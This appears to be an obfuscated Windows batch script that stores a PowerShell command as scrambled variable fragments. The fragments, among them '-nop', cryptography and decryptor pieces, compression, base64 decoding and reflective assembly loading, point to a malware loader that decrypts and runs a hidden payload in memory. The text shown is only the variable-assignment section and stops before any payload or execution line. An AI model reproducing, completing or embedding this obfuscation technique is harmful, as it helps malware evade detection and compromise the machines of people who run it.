@echo off
set "SzzaKanWiB=m.IO"
set "spdoIxutIt=-Obj"
set "EqXmMapYmw=tS46"
set "JPzXLYeOMo='gni"
set "XZadaUtVJs=[IO."
set "qeOLLmDuJr=Obje"
set "amvuADguhD='[-1"
set "qWsstUMmIC=tion"
set "NgHGrvQoIq=jA);"
set "RRICdLcGDy=e]::"
set "iPqHcesYSW=DDL "
set "GyTBziayyJ=-nop"
set "vbrQtcnZzy=  $y"
set "nqFPXDaMUc=ptog"
set "RVFzaRmelC=.Cop"
set "OOquBzqlPN=$iwh"
set "AxovTtOVPB=raph"
set "OPGsMVVPOd=e = "
set "pnnNCLUfSM=]::("
set "MKqfGAZxmK=rity"
set "mTudLMMJVg=ring"
set "DLXYbpghfQ=-joi"
set "JKyCHVptvL= = $"
set "TheOSmwyMs=e.Su"
set "EBjSpHyrEc=ct S"
set "xFyKxTBadZ=;$Kq"
set "sBCoNwsTZZ=Rs ="
set "RebCfKtiLs=d;$M"
set "aORQFQfrfF=ke($"
set "RXpgDYJHta=::De"
set "qsqkUhgEnh=:: '"
set "JdJpsuIplo=rt]:"
set "MaEtWiCImt=);$F"
set "GWgfmdQjza=GMPD"
set "dePgcvuoEL=.Mem"
set "zwCKXAqUxg=ptor"
set "LFpCayDJWe=[Env"
set "urhrZEmfAE=yste"
set "oyNCcchdfo=oaMi"
set "JnkZVdlxIC=6esa"
set "eIseFzSMxL=.Sec"
set "lTQdTNkpPv=+hAO"
set "CapSmPqcBD=]::C"
set "LlqsfYCqaz=k; }"
set "UuCTznnmnY=.Ass"
set "NuSkmyhkVr=ach "
set "qCOIRslzJL=EcO."
set "haZUrDYfps=t.Pa"
set "FttOOEeWBP= = ["
set "AdxpsajjAa= [Sy"
set "FZLkVaadkP=ress"
set "aEtAyvEzcH=1..-"
set "NooJPMDoGF=b) {"
set "DZLALTRqdB=comm"
set "LalOiJJqbv=JCRs"
set "ZIvIPMFiac=form"
set "eSeOXVoBef=$iwh"
set "IVdFhPRnjq=TllA"
set "JuhdTfWCBn=F'[-"
set "RnWttpFAdr=rofi"
